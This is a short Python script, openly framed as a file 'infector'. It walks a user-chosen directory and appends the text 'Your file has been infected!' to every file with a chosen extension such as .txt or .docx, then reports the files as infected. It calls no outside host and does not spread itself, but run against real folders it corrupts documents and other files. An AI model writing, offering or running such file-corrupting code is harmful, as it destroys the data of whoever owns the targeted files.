import os

def infect_files(directory, extension):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(extension):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, 'a') as f:
                        f.write("Your file has been infected!")
                except Exception as e:
                    print(f"Failed to infect {file_path}: {e}")

def main():
    directory = input("Enter the directory to infect: ")
    extension = input("Enter the file extension to target (e.g., .txt, .docx): ")

    infect_files(directory, extension)
    print("Files infected successfully!")

if __name__ == "__main__":
    main()
